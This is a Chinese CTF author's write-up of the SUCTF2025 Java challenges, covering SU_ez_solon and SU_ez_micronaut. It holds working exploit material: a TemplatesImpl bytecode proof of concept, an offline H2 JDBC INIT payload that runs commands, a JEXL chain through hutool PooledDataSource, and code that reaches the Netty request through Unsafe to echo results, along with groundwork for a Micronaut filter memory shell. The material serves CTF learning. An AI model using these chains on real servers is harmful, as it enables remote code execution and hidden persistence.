@@ -1,0 +1,1513 @@
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<title>SUCTF2025 出题记录 - yulate&#39;s blog</title>
+<link rel="shortcut icon" href="https://yulate.github.io/favicon.ico">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.2.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css">
+<link rel="stylesheet" href="https://yulate.github.io/media/css/tailwind.css">
+<link rel="stylesheet" href="https://yulate.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="SUCTF2025 出题记录 - yulate&#39;s blog - Atom Feed" href="https://yulate.github.io/atom.xml">
+
+    
+
+  <meta name="description" content="SU_ez_solon
+起源于偶尔挖到的一个链子（貌似已经在某篇文章里面提到了
+[JDBC Gadget] &amp;lt;org.noear.solon.data.util.UnpooledDataSource: java.sql.Connect..." />
+  <meta property="og:title" content="SUCTF2025 出题记录 - yulate&#39;s blog">
+  <meta property="og:description" content="SU_ez_solon
+起源于偶尔挖到的一个链子（貌似已经在某篇文章里面提到了
+[JDBC Gadget] &amp;lt;org.noear.solon.data.util.UnpooledDataSource: java.sql.Connect..." />
+  <meta property="og:type" content="articles">
+  <meta property="og:url" content="https://yulate.github.io/post/suctf2025-chu-ti-ji-lu/" />
+  <meta property="og:image" content="https://yulate.github.io/images/avatar.png">
+  <meta property="og:image:height" content="630">
+  <meta property="og:image:width" content="1200">
+  <meta name="twitter:title" content="SUCTF2025 出题记录 - yulate&#39;s blog">
+  <meta name="twitter:description" content="SU_ez_solon
+起源于偶尔挖到的一个链子（貌似已经在某篇文章里面提到了
+[JDBC Gadget] &amp;lt;org.noear.solon.data.util.UnpooledDataSource: java.sql.Connect...">
+  <meta name="twitter:card" content="summary_large_image">
+  <link rel="canonical" href="https://yulate.github.io/post/suctf2025-chu-ti-ji-lu/">
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css">
+ 
+  
+    <link rel="stylesheet" href="https://yulate.github.io/media/css/prism-atom-dark.css">
+  
+
+  
+</head>
+
+<body>
+  <div class="antialiased flex flex-col min-h-screen" id="app">
+    <a href="https://yulate.github.io" class="fixed top-0 left-0 mt-4 bg-black text-white dark:text-gray-700 dark:bg-yellow-50 dark:hover:bg-black dark:hover:text-white inline-flex p-2 pl-8 hover:text-gray-700 hover:bg-yellow-50 font-bold z-10 transition-fast animated fadeInLeft">
+      yulate&#39;s blog
+    </a>
+    <div class="max-w-4xl w-full mx-auto">
+      <div class="shadow-box bg-white dark:bg-gray-600 rounded-lg pt-32 md:pt-64 px-4 md:px-8 pb-8 animated fadeIn mb-8">
+        <h1 class="text-5xl font-semibold leading-normal pb-8 mb-8 border-b-8 border-gray-700">
+          SUCTF2025 出题记录
+        </h1>
+        
+        <div class="mb-8 flex flex-wrap">
+          <div class="text-gray-400 text-sm mr-4">2025-02-08 · 41 min read</div>
+          
+        </div>
+        <div class="markdown mb-8" v-pre>
+          <h1 id="su_ez_solon">SU_ez_solon</h1>
+<p>起源于偶尔挖到的一个链子（貌似已经在某篇文章里面提到了</p>
+<pre><code>[JDBC Gadget] &lt;org.noear.solon.data.util.UnpooledDataSource: java.sql.Connection getConnection()&gt;
+ -&gt; &lt;java.sql.DriverManager: java.sql.Connection getConnection(java.lang.String)&gt;
+</code></pre>
+<p>在结合上最近在实战中碰到的一个特殊环境，java 层面的无法执行任意命令，为了模拟这个环境本题采用了 securityManager 进行拦截</p>
+<p>解题整体的思路非常的简单，在依赖中也可以明确的发现有 h2 和 jackson 依赖，从这也能推测得出出题人十之八九是要找一个 getter 到 jdbc 的链子，这一步用 codeql 或者其他的静态分析工具就会很快得出结果</p>
+<p>第二步是对 securityManager 的绕过，这有两种思路<br>
+● 通过反序列化直接关闭 securityManager<br>
+● 写 so 加载进行二次利用</p>
+<p>wp 就到这了，希望下次能给大家带来更好的题目</p>
+<h1 id="su_ez_micronaut">SU_ez_micronaut</h1>
+<h2 id="0x01-micronaut-序列化特性">0x01 micronaut 序列化特性</h2>
+<p>Micronaut Serialization 是一个允许将对象序列化和反序列化为 JSON 等常见序列化格式的库</p>
+<figure data-type="image" tabindex="1"><img src="https://p.ipic.vip/u54elm.png" alt="" loading="lazy"></figure>
+<p>jackson反序列化，但是在micronaut中不能将任意对象序列化或反序列化为 JSON，使用 Micronaut 序列化，要允许类型被序列化或反序列化，必须执行以下操作之一：</p>
+<ol>
+<li>在源代码中的类型级别声明 <a href="https://micronaut-projects.github.io/micronaut-serialization/latest/api/io/micronaut/serde/annotation/Serdeable.html">@Serdeable</a> 注解，以允许类型被序列化或反序列化。</li>
+<li>如果无法修改源代码，且该类型是外部类型，则可以使用 <a href="https://micronaut-projects.github.io/micronaut-serialization/latest/api/io/micronaut/serde/annotation/SerdeImport.html">@SerdeImport</a> 来导入该类型。请注意，这种方法只考虑公共成员。</li>
+<li>为序列化定义一个 <a href="https://micronaut-projects.github.io/micronaut-serialization/latest/api/io/micronaut/serde/Serializer.html">Serializer</a> 类型的 Bean 和/或为反序列化定义一个 <a href="https://micronaut-projects.github.io/micronaut-serialization/latest/api/io/micronaut/serde/Deserializer.html">Deserializer</a> 类型的 Bean。</li>
+</ol>
+<p>在该题中只有一个bean类被允许反序列化</p>
+<figure data-type="image" tabindex="2"><img src="https://p.ipic.vip/sim339.png" alt="" loading="lazy"></figure>
+<p>user类被@JsonFilter(”key-filter”)注解修饰，micronaut中可以自定义自定义属性过滤器，找到对应的属性过滤器代码如下</p>
+<figure data-type="image" tabindex="3"><img src="https://p.ipic.vip/jog3pr.png" alt="" loading="lazy"></figure>
+<p>其中代码分成两个部分，第一个部分是自定义属性过滤器的实现代码，判断反序列化的bean是否为User类，如果是的话检查传递的json键中是否包含key，包含的话使用base64解码，再使用<code>&lt;---&gt;</code>进行分割字符串，分割结果为三个部分，大致功能如下：</p>
+<ol>
+<li>使用gson将json反序列化为字符串，结果作为checkKey的第一个参数</li>
+<li>作为checkKey方法的第二个参数</li>
+<li>检测第三部分是否为admin字符串</li>
+</ol>
+<p>checkKey方法主要的作用是调用jexl引擎执行表达式，并且上下文和表达式都是我们可以控制的内容</p>
+<h2 id="0x02-jexl-表达式任意getter-setter调用">0x02 Jexl 表达式任意getter、setter调用</h2>
+<p>原理在于处理表达式的时候会调用对应field的对应getter方法</p>
+<p><a href="https://xz.aliyun.com/t/15365?u_atoken=1c8882ee613bce23171278d19d701803&amp;u_asig=0a472f4317262966979632506e0137">SimpleEvaluationContext 条件下spel注入 - 先知社区 (aliyun.com)</a></p>
+<h3 id="poc">poc</h3>
+<pre><code class="language-java">package com.example;
+
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.ClassPool;
+import javassist.CtClass;
+import org.apache.commons.jexl3.*;
+
+import java.lang.reflect.Field;
+
+public class Test {
+
+    public static void main(String[] args) throws Exception {
+        ClassPool pool = ClassPool.getDefault();
+        CtClass cc = pool.makeClass(&quot;EvilClass&quot;);
+        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\\&quot;open /System/Applications/Calculator.app\\&quot;);&quot;;
+        cc.makeClassInitializer().insertBefore(cmd);
+        String randomClassName = &quot;akka1&quot; + System.nanoTime();
+        cc.setName(randomClassName);
+        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));
+
+        byte[] evilCode = cc.toBytecode();
+
+        TemplatesImpl templates = new TemplatesImpl();
+        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]{evilCode});
+        setFieldValue(templates, &quot;_name&quot;, &quot;calc&quot;);
+        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+
+        eval(templates, &quot;outputProperties&quot;);
+    }
+
+    public static Object eval(Object root, String expr) {
+        // 创建 JEXL 引擎
+        JexlEngine jexl = new JexlBuilder().create();
+
+        // 创建表达式
+        JexlExpression jexlExpr = jexl.createExpression(expr);
+
+        // 创建上下文，并将 root 对象包装在 ObjectContext 中
+        JexlContext context = new ObjectContext&lt;&gt;(jexl, root);
+
+        // 评估表达式
+        return jexlExpr.evaluate(context);
+    }
+
+    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+}
+</code></pre>
+<h3 id="debug调试">debug调试</h3>
+<p>在对应get方法下断点可以获得如下调用栈</p>
+<pre><code class="language-java">getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
+invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+invoke:62, NativeMethodAccessorImpl (sun.reflect)
+invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+invoke:498, Method (java.lang.reflect)
+invoke:64, PropertyGetExecutor (org.apache.commons.jexl3.internal.introspection)
+get:66, ObjectContext (org.apache.commons.jexl3)
+getVariable:319, InterpreterBase (org.apache.commons.jexl3.internal)
+visit:1048, Interpreter (org.apache.commons.jexl3.internal)
+jjtAccept:118, ASTIdentifier (org.apache.commons.jexl3.parser)
+visit:1029, Interpreter (org.apache.commons.jexl3.internal)
+jjtAccept:58, ASTJexlScript (org.apache.commons.jexl3.parser)
+interpret:193, Interpreter (org.apache.commons.jexl3.internal)
+execute:188, Script (org.apache.commons.jexl3.internal)
+evaluate:180, Script (org.apache.commons.jexl3.internal)
+eval:45, Test (com.example)
+main:30, Test (com.example)
+</code></pre>
+<p>核心代码在org.apache.commons.jexl3.internal.InterpreterBase#getVariable方法中，在getVariable方法中调用了上下文中的get方法，name值为我们传递的表达式</p>
+<figure data-type="image" tabindex="4"><img src="https://p.ipic.vip/w5wgmy.png" alt="" loading="lazy"></figure>
+<p>进一步跟入调用的org.apache.commons.jexl3.ObjectContext#get方法</p>
+<figure data-type="image" tabindex="5"><img src="https://p.ipic.vip/ckcti4.png" alt="" loading="lazy"></figure>
+<p>调用<code>getPropertyGet</code>来获取 <code>this.object</code> 对象中名为 <code>name</code> 的属性的 getter 方法</p>
+<figure data-type="image" tabindex="6"><img src="https://p.ipic.vip/r1apc6.png" alt="" loading="lazy"></figure>
+<p>获取method</p>
+<figure data-type="image" tabindex="7"><img src="https://p.ipic.vip/k44vax.png" alt="" loading="lazy"></figure>
+<p>最后在get方法中invoke调用该方法</p>
+<h3 id="深入研究">深入研究</h3>
+<p>在查看进行调试的时候能够发现在get之外还有has和set两个方法，可能也同样存在着类似的问题</p>
+<figure data-type="image" tabindex="8"><img src="https://p.ipic.vip/w2y9sd.png" alt="" loading="lazy"></figure>
+<h3 id="任意setter调用">任意setter调用</h3>
+<p>调用栈</p>
+<pre><code class="language-java">setAddress:48, Person (com.example)
+invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+invoke:62, NativeMethodAccessorImpl (sun.reflect)
+invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+invoke:498, Method (java.lang.reflect)
+invoke:89, PropertySetExecutor (org.apache.commons.jexl3.internal.introspection)
+set:81, ObjectContext (org.apache.commons.jexl3)
+setContextVariable:351, InterpreterBase (org.apache.commons.jexl3.internal)
+executeAssign:1347, Interpreter (org.apache.commons.jexl3.internal)
+visit:1239, Interpreter (org.apache.commons.jexl3.internal)
+jjtAccept:19, ASTAssignment (org.apache.commons.jexl3.parser)
+visit:1029, Interpreter (org.apache.commons.jexl3.internal)
+jjtAccept:58, ASTJexlScript (org.apache.commons.jexl3.parser)
+interpret:193, Interpreter (org.apache.commons.jexl3.internal)
+execute:188, Script (org.apache.commons.jexl3.internal)
+evaluate:180, Script (org.apache.commons.jexl3.internal)
+eval:66, Test (com.example)
+setter:26, Test (com.example)
+main:18, Test (com.example)
+</code></pre>
+<p>org.apache.commons.jexl3.internal.InterpreterBase#setContextVariable</p>
+<figure data-type="image" tabindex="9"><img src="https://p.ipic.vip/jl7u8m.png" alt="" loading="lazy"></figure>
+<p>原理和任意getter调用一致</p>
+<p>在理解了如上部分就能继续往下做题，从剩下的代码中寻找可用的类进行调用，主要目标集中在getter和setter中，很容易就能找到BeanUtil类，其中最可用的方法为getUnsafeInstance，setUrl方法可以触发反序列化，但在jdk17中无法使用templatesImpl类，并且赛题不出网，需要打内存马进行利用，这里不太适合，但也是可以考虑的点</p>
+<pre><code class="language-java">package hello.micronaut.utils;
+
+import sun.misc.Unsafe;
+
+import javax.imageio.ImageIO;
+import java.io.ByteArrayInputStream;
+import java.io.IOException;
+import java.io.ObjectInputStream;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.net.MalformedURLException;
+import java.net.URL;
+import java.net.URLClassLoader;
+import java.awt.image.BufferedImage;
+
+public class BeanUtil {
+
+    private String url;
+    private String p;
+    private String n;
+    private Object d;
+
+    public BeanUtil() {
+    }
+
+    public BufferedImage setImage(String imageUrl) {
+        BufferedImage image = null;
+        try {
+            URL url = new URL(imageUrl);
+            // 创建一个 URLClassLoader 用于加载资源
+            URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{url});
+            urlClassLoader.loadClass(this.n);
+            image = ImageIO.read(urlClassLoader.getResource(url.getPath()));
+        } catch (MalformedURLException e) {
+            System.err.println(&quot;URL 格式不正确: &quot; + e.getMessage());
+        } catch (IOException e) {
+            System.err.println(&quot;无法加载图片: &quot; + e.getMessage());
+        } catch (ClassNotFoundException e) {
+            throw new RuntimeException(e);
+        }
+        return image;
+    }
+
+    public String getUrl() {
+        System.out.println(&quot;getter !!!&quot;);
+        return url;
+    }
+
+    public void setUrl(String url) throws Exception {
+        System.out.println(&quot;setUrl !!!&quot; + url);
+        if (url.contains(&quot;http&quot;)) {
+            this.url = url;
+        } else {
+            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(url.getBytes());
+            ObjectInputStream inputStream = new ObjectInputStream(byteArrayInputStream);
+            Object object = inputStream.readObject();
+            this.url = object.toString();
+        }
+    }
+
+    public void setU(String u) throws Exception {
+        Unsafe unsafe = getUnsafeInstance();
+        Class&lt;?&gt; clazz = Class.forName(u);
+        Object instance = unsafe.allocateInstance(clazz);
+        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.forName(this.n));
+        constructor.setAccessible(true);
+        instance = constructor.newInstance(this.d);
+    }
+
+    // 获取Unsafe实例的方法
+    private static Unsafe getUnsafeInstance() {
+        try {
+            Field unsafeField = Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);
+            unsafeField.setAccessible(true);
+            return (Unsafe) unsafeField.get(null);
+        } catch (Exception e) {
+            throw new RuntimeException(&quot;Unable to access Unsafe instance&quot;, e);
+        }
+    }
+
+    public String getP() {
+        return p;
+    }
+
+    public void setP(String p) {
+        this.p = p;
+    }
+
+    public Object getD() {
+        return d;
+    }
+
+    public void setD(Object d) {
+        this.d = d;
+    }
+
+    public String getN() {
+        return n;
+    }
+
+    public void setN(String n) {
+        this.n = n;
+    }
+}
+</code></pre>
+<p>getUnsafeInstance该方法主要的功能为使用unsafe反射调用任意构造函数，并且参数和参数类型为BeanUtil类中的属性，属性都存在对应的getter、setter方法，可以使用jexl表达式的特性为其赋值，这里需要使用特殊的写法来同时为多个值设置属性，现在可以写出大概如下的表达式</p>
+<pre><code class="language-java">[n='1',d='1',u='']
+</code></pre>
+<p>需要注意的是赋值会按照表达式排列的顺序进行，如果顺序错误会导致反射失败</p>
+<h2 id="0x03-h2-jdbc-任意代码执行">0x03 h2 jdbc 任意代码执行</h2>
+<p>在高版本的jdk利用中主流的打法就是采用jdbc相关的漏洞，并且在赛题中存在h2的依赖</p>
+<figure data-type="image" tabindex="10"><img src="https://p.ipic.vip/c10mmm.png" alt="" loading="lazy"></figure>
+<p>需要进行考虑的一点就是如何在不出网的情况下进行利用，网络上常见的打法都是采用加载远程sql文件执行rce，不过可以在一篇文章中找到如何进行不出网的利用</p>
+<p><a href="https://mp.weixin.qq.com/s/5zr2qWMd9GFMu37P89qjxA">Java安全攻防之老版本Fastjson的一些不出网利用 (qq.com)</a></p>
+<p><a href="http://www.bmth666.cn/2024/03/31/%E7%AC%AC%E4%BA%8C%E5%B1%8A-AliyunCTF-chain17%E5%A4%8D%E7%8E%B0/index.html">第二届 AliyunCTF chain17复现 | Bmth's blog (bmth666.cn)</a></p>
+<p>为什么需要RUNSCRIPT? 按照网上的说法是： 1、H2 RCE分为两个步骤，需要先创建代码执行方法，再通过EXEC执行该方法 2、H2 init所使用的session.prepareCommand不支持执行多条SQL语句</p>
+<p>其实并不需要 RUNSCRIPT 出网加载，prepareCommand本身是支持多条SQL语句执行：（仅需要将分号转义即可）</p>
+<p>h2 不出网payload：</p>
+<pre><code class="language-java">jdbc:h2:mem:test;MODE=MSSQLServer;INIT=CREATE ALIAS if not exists EXEC AS 'void exec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\;}'\;CALL EXEC ('calc')\;
+</code></pre>
+<p>结合上述，现在可以构造出如下payload</p>
+<pre><code class="language-java">[n='cn.hutool.db.ds.pooled.PooledDataSource',d=new('cn.hutool.db.ds.pooled.PooledDataSource',new('cn.hutool.db.ds.pooled.DbConfig','jdbc:h2:mem:test;MODE=MSSQLServer;INIT=CREATE ALIAS if not exists EXEC AS \\'void exec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;}\\'\\;CALL EXEC (\\'open -a Calculator\\')\\;','1111','111')),u='cn.hutool.db.ds.pooled.PooledConnection']
+</code></pre>
+<p>该payload可以成功弹出计算器，但赛题不出网，需要探究在micronaut框架如何打入内存马</p>
+<h2 id="0x04-micronaut-内存马探索">0x04 micronaut 内存马探索</h2>
+<p>如果有tomcat或spring内存马学习经验的话可以很明确的整理出如果想从零挖掘一个内存马的具体步骤，我将其具体分为三个部分</p>
+<ol>
+<li>获取context上下文
+<ol>
+<li>通过线程进行获取</li>
+<li>通过分析micronaut框架流程获取关键类属性</li>
+</ol>
+</li>
+<li>分析常见类型内存马可加载类运行流程
+<ol>
+<li>filter</li>
+<li>listener</li>
+<li>controller</li>
+<li>……</li>
+</ol>
+</li>
+<li>将第二步生成的恶意类加载到context上下文中</li>
+</ol>
+<p>下文将按照上述三个部分来具体表现如何挖掘一个新的内存马</p>
+<h3 id="获取context上下文">获取context上下文</h3>
+<p>获取context通用的手段一般都是从当前请求线程中获取，在以前的话需要自己手工进行分析，c0ny1师傅开发了一款很方便的工具，能够在内存中快速搜索出想要的对象</p>
+<p><a href="https://github.com/c0ny1/java-object-searcher">https://github.com/c0ny1/java-object-searcher</a></p>
+<p>先需要clone项目编译出jar包，再将编译好的jar包添加进需要分析的项目作为lib，做好前期准备后就可以编写调用代码搜索目标对象，先尝试搜索出request对象，在idea中debug运行需要分析的项目，Evaluate</p>
+<pre><code class="language-java">//设置搜索类型包含Request关键字的对象
+List&lt;Keyword&gt; keys = new ArrayList&lt;&gt;();
+keys.add(new Keyword.Builder().setField_type(&quot;Request&quot;).build());
+//定义黑名单
+List&lt;Blacklist&gt; blacklists = new ArrayList&lt;&gt;();
+blacklists.add(new Blacklist.Builder().setField_type(&quot;java.io.File&quot;).build());
+//新建一个广度优先搜索Thread.currentThread()的搜索器
+SearchRequstByBFS searcher = new SearchRequstByBFS(Thread.currentThread(),keys);
+// 设置黑名单
+searcher.setBlacklists(blacklists);
+//打开调试模式,会生成log日志
+searcher.setIs_debug(true);
+//挖掘深度为20
+searcher.setMax_search_depth(20);
+//设置报告保存位置
+searcher.setReport_save_path(&quot;/tmp&quot;);
+searcher.searchObject();
+</code></pre>
+<p>在tmp目录下可以拿到分析的结果，这里选择最短的两条来进行展示</p>
+<pre><code class="language-java">TargetObject = {io.micronaut.http.netty.channel.NettyThreadFactory$NonBlockingFastThreadLocalThread}
+  ---&gt; threadLocalMap = {io.netty.util.internal.InternalThreadLocalMap}
+   ---&gt; indexedVariables = {class [Ljava.lang.Object;}
+    ---&gt; [10] = {io.micronaut.core.propagation.PropagatedContextImpl}
+     ---&gt; elements = {class [Lio.micronaut.core.propagation.PropagatedContextElement;}
+      ---&gt; [0] = {io.micronaut.http.context.ServerHttpRequestContext}
+
+TargetObject = {io.micronaut.http.netty.channel.NettyThreadFactory$NonBlockingFastThreadLocalThread}
+  ---&gt; threadLocalMap = {io.netty.util.internal.InternalThreadLocalMap}
+   ---&gt; indexedVariables = {class [Ljava.lang.Object;}
+    ---&gt; [10] = {io.micronaut.core.propagation.PropagatedContextImpl}
+     ---&gt; elements = {class [Lio.micronaut.core.propagation.PropagatedContextElement;}
+      ---&gt; [0] = {io.micronaut.http.context.ServerHttpRequestContext}
+       ---&gt; httpRequest = {io.micronaut.http.server.netty.NettyHttpRequest}
+</code></pre>
+<p>debug查看</p>
+<figure data-type="image" tabindex="11"><img src="https://p.ipic.vip/2iocia.png" alt="" loading="lazy"></figure>
+<p>最终的httpRequest确实和分析出的堆栈一致，编写代码获取该对象</p>
+<pre><code class="language-java">try {
+    // 获取Unsafe实例
+    Field unsafeField = Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);
+    unsafeField.setAccessible(true);
+    Unsafe unsafe = (Unsafe) unsafeField.get(null);
+
+    // 获取当前线程 (假设线程类型是NettyThreadFactory$NonBlockingFastThreadLocalThread)
+    Thread currentThread = Thread.currentThread();
+
+    // 检查是否是Netty的线程类型
+    if (currentThread.getClass().getName().contains(&quot;NettyThreadFactory$NonBlockingFastThreadLocalThread&quot;)) {
+        // 获取threadLocalMap字段的偏移量
+        Field threadLocalMapField = currentThread.getClass().getSuperclass().getDeclaredField(&quot;threadLocalMap&quot;);
+        long threadLocalMapOffset = unsafe.objectFieldOffset(threadLocalMapField);
+
+        // 使用Unsafe获取threadLocalMap字段的值
+        InternalThreadLocalMap threadLocalMap = (InternalThreadLocalMap) unsafe.getObject(currentThread, threadLocalMapOffset);
+        System.out.println(&quot;ThreadLocalMap: &quot; + threadLocalMap);
+
+        // 获取threadLocalMap中的indexedVariables
+        Field indexedVariablesField = InternalThreadLocalMap.class.getDeclaredField(&quot;indexedVariables&quot;);
+        indexedVariablesField.setAccessible(true);
+        Object[] indexedVariables = (Object[]) indexedVariablesField.get(threadLocalMap);
+
+        // 获取索引为10的变量
+        Object indexedVariable = indexedVariables[10];
+
+        // 确认indexedVariable是PropagatedContextImpl类型
+        if (indexedVariable != null &amp;&amp; indexedVariable.getClass().getName().contains(&quot;PropagatedContextImpl&quot;)) {
+            // 获取PropagatedContextImpl的elements属性
+            Field elementsField = indexedVariable.getClass().getDeclaredField(&quot;elements&quot;);
+            elementsField.setAccessible(true);
+            PropagatedContextElement[] elements = (PropagatedContextElement[]) elementsField.get(indexedVariable);
+
+            PropagatedContextElement element = elements[0];
+
+            // 反射获取element的httpRequest属性
+            if (element != null &amp;&amp; element.getClass().getName().contains(&quot;ServerHttpRequestContext&quot;)) {
+                // 获取ServerHttpRequestContext类中的httpRequest字段
+                Field httpRequestField = element.getClass().getDeclaredField(&quot;httpRequest&quot;);
+                httpRequestField.setAccessible(true);
+                NettyHttpRequest httpRequest = (NettyHttpRequest) httpRequestField.get(element);
+                
+            } else {
+                System.out.println(&quot;element不是ServerHttpRequestContext类型。&quot;);
+            }
+        } else {
+            System.out.println(&quot;Indexed variable is not of type PropagatedContextImpl.&quot;);
+        }
+
+    } else {
+        System.out.println(&quot;当前线程不是Netty的线程类型。&quot;);
+    }
+
+} catch (Exception e) {
+    e.printStackTrace();
+}
+</code></pre>
+<p>在jdk17中反射存在很大的限制无法直接使用，可以通过unsafe绕过这个限制，运行代码获取到结果</p>
+<figure data-type="image" tabindex="12"><img src="https://p.ipic.vip/d5ij9t.png" alt="" loading="lazy"></figure>
+<p>到获取到request对象后可以直接修改response进行简单回显</p>
+<pre><code class="language-java">NettyHttpRequest httpRequest = (NettyHttpRequest) httpRequestField.get(element);
+ChannelHandlerContext channelHandlerContext = httpRequest.getChannelHandlerContext();
+
+FullHttpResponse response = new DefaultFullHttpResponse(
+        HttpVersion.HTTP_1_1,
+        HttpResponseStatus.OK,
+        Unpooled.copiedBuffer(&quot;{\&quot;message\&quot;:\&quot;hacked !!!!\&quot;}&quot;, CharsetUtil.UTF_8)
+);
+response.headers().set(HttpHeaderNames.CONTENT_TYPE, &quot;application/json&quot;);
+response.headers().set(HttpHeaderNames.CONTENT_LENGTH, response.content().readableBytes());
+channelHandlerContext.writeAndFlush(response);
+</code></pre>
+<p>可以将执行命令的结果写到response中，当前请求的request body展示的即为结果。</p>
+<p>简单回显已经可以解出该题，剩下filter内存马部分作为学习补充。</p>
+<h3 id="filter-注册流程分析">filter 注册流程分析</h3>
+<p>按照文档添加一个新的filter进行debug</p>
+<pre><code class="language-java">package hello.micronaut.config;
+
+import io.micronaut.core.annotation.Order;
+import io.micronaut.http.HttpRequest;
+import io.micronaut.http.MutableHttpResponse;
+import io.micronaut.http.annotation.Filter;
+import io.micronaut.http.filter.HttpServerFilter;
+import io.micronaut.http.filter.ServerFilterChain;
+import org.reactivestreams.Publisher;
+
+@Filter(&quot;/**&quot;)
+@Order(10)
+public class CustomHttpFilter implements HttpServerFilter {
+    @Override
+    public Publisher&lt;MutableHttpResponse&lt;?&gt;&gt; doFilter(HttpRequest&lt;?&gt; request, ServerFilterChain chain) {
+        System.out.println(&quot;Filtering request: &quot; + request.getPath());
+        return chain.proceed(request);
+    }
+}
+</code></pre>
+<p>在sout行打上断点，随便请求一个路由就能成功断下，获取到重要部分的堆栈</p>
+<pre><code class="language-java">doFilter:16, CustomHttpFilter (hello.micronaut.config)
+doFilter:48, HttpServerFilter (io.micronaut.http.filter)
+processRequestFilter:75, AroundLegacyFilter (io.micronaut.http.filter)
+filterRequest:276, FilterRunner (io.micronaut.http.filter)
+run:247, FilterRunner (io.micronaut.http.filter)
+runServerFilters:422, RequestLifecycle (io.micronaut.http.server)
+normalFlow:160, RequestLifecycle (io.micronaut.http.server)
+handleNormal:93, NettyRequestLifecycle (io.micronaut.http.server.netty)
+accept:235, RoutingInBoundHandler (io.micronaut.http.server.netty)
+read:415, PipeliningServerHandler$MessageInboundHandler (io.micronaut.http.server.netty.handler)
+channelRead:221, PipeliningServerHandler (io.micronaut.http.server.netty.handler)
+invokeChannelRead:444, AbstractChannelHandlerContext (io.netty.channel)
+invokeChannelRead:420, AbstractChannelHandlerContext (io.netty.channel)
+fireChannelRead:412, AbstractChannelHandlerContext (io.netty.channel)
+fireChannelRead:436, CombinedChannelDuplexHandler$DelegatingChannelHandlerContext (io.netty.channel)
+fireChannelRead:346, ByteToMessageDecoder (io.netty.handler.codec)
+channelRead:318, ByteToMessageDecoder (io.netty.handler.codec)
+channelRead:251, CombinedChannelDuplexHandler (io.netty.channel)
+invokeChannelRead:442, AbstractChannelHandlerContext (io.netty.channel)
+invokeChannelRead:420, AbstractChannelHandlerContext (io.netty.channel)
+fireChannelRead:412, AbstractChannelHandlerContext (io.netty.channel)
+channelRead:289, IdleStateHandler (io.netty.handler.timeout)
+invokeChannelRead:442, AbstractChannelHandlerContext (io.netty.channel)
+invokeChannelRead:420, AbstractChannelHandlerContext (io.netty.channel)
+fireChannelRead:412, AbstractChannelHandlerContext (io.netty.channel)
+channelRead:1357, DefaultChannelPipeline$HeadContext (io.netty.channel)
+invokeChannelRead:440, AbstractChannelHandlerContext (io.netty.channel)
+invokeChannelRead:420, AbstractChannelHandlerContext (io.netty.channel)
+fireChannelRead:868, DefaultChannelPipeline (io.netty.channel)
+read:166, AbstractNioByteChannel$NioByteUnsafe (io.netty.channel.nio)
+processSelectedKey:788, NioEventLoop (io.netty.channel.nio)
+processSelectedKeysOptimized:724, NioEventLoop (io.netty.channel.nio)
+processSelectedKeys:650, NioEventLoop (io.netty.channel.nio)
+run:562, NioEventLoop (io.netty.channel.nio)
+run:997, SingleThreadEventExecutor$4 (io.netty.util.concurrent)
+run:74, ThreadExecutorMap$2 (io.netty.util.internal)
+run:30, FastThreadLocalRunnable (io.netty.util.concurrent)
+run:840, Thread (java.lang)
+</code></pre>
+<p>逆向回溯堆栈处理的逻辑会看到如下部分</p>
+<figure data-type="image" tabindex="13"><img src="https://p.ipic.vip/vkzvch.png" alt="" loading="lazy"></figure>
+<p><code>InternalHttpFilter filter = iterator.next();</code> 中保存的就是当前获取到的filter</p>
+<figure data-type="image" tabindex="14"><img src="https://p.ipic.vip/rqsyr8.png" alt="" loading="lazy"></figure>
+<p>继续寻找调用filterRequest方法的位置</p>
+<figure data-type="image" tabindex="15"><img src="https://p.ipic.vip/51isfp.png" alt="" loading="lazy"></figure>
+<p>在<code>io.micronaut.http.filter.FilterRunner#run(io.micronaut.http.HttpRequest&lt;?&gt;, io.micronaut.core.propagation.PropagatedContext)</code>方法中存在如下两行代码</p>
+<pre><code class="language-java">filtersToRun = filterFilters(findInternalFiltersAfterRouteMatch(request), request);
+iterator = filtersToRun.listIterator();
+</code></pre>
+<p>这两行代码计算出了全部的filter，在这一行上打上断点，重新运行，点击步入到<code>findInternalFiltersAfterRouteMatch</code> 方法</p>
+<figure data-type="image" tabindex="16"><img src="https://p.ipic.vip/kmwgqo.png" alt="" loading="lazy"></figure>
+<p><code>routeExecutor.router</code> 属性的类型为DefaultRouter，对其调用findFilters方法</p>
+<figure data-type="image" tabindex="17"><img src="https://p.ipic.vip/rqim1y.png" alt="" loading="lazy"></figure>
